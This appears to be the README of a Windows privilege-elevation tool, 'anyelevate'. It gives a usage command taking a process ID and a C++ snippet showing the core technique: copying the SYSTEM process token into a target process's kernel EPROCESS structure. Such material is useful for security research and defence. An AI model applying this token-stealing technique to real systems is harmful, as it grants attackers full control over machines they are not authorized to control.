<p align="center">
<img src="image.png">
  
<img src="https://img.shields.io/github/workflow/status/kkent030315/anyelevate/MSBuild?style=for-the-badge">
<img src="https://img.shields.io/badge/platform-win--64-00a2ed?style=for-the-badge">
<img src="https://img.shields.io/github/license/kkent030315/anyelevate?style=for-the-badge">
</p>

# anyelevate
x64 Windows privilege elevation using anycall

# Usage

```bash
anyelevate.exe [process id]
```

- `[process id]` process id to elevate privilege

# How

Simply create copy of `nt!_EPROCESS.Token` in any desired target process.

```cpp
kernel::memcpy(
    ( void* )( ( uint64_t )process + RVA_PEPROCESS_TOKEN ),
    &system_process_token,
    sizeof( EX_FAST_REF ) );
```

## License

MIT copyright Kento Oki \<hrn832@protonmail.com\>

[color-console](https://github.com/kkent030315/anyelevate/blob/main/anyelevate/color.hpp) copyright 2018 Lei Fu
